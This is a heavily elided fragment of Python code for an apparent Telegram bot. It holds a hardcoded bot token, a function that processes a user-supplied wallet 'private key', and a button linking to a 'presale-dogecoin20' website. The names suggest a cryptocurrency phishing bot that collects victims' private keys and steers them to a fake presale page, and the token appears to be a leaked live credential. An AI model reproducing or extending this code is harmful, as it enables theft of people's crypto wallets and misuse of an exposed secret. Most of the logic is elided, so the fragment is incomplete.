...
BOT_TOKEN = '7189410769:AAGueLa7SVz_x5HLaOGasNKs9CCQntCDtVc'
...
def process_private_key(message):
    ...
    if private_key.lower() == '/continue':
        ...
        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://presale-dogecoin20.pages.dev/')
